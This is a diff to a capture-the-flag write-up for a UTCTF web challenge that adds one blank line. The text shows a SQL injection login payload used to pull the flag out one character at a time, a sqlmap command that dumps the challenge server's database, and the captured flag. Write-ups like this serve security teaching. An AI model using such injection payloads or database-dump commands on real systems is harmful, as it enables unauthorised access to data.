@@ -19,6 +19,7 @@ By using `admin' and password like 'utctf{%'--`, we can sign in successfully, to
 Then, we can get the flag cahracter by character using the payload above.
 
 > By using sqlmap, we can get the flag without writing the script ourselves.
+
 > $ sqlmap -u "http://web2.utctf.live:5006/" --data "username=test&pass=test" -p "username,pass" --technique B --dump
 
 Flag `utflag{dual1pa1sp3rf3ct}`
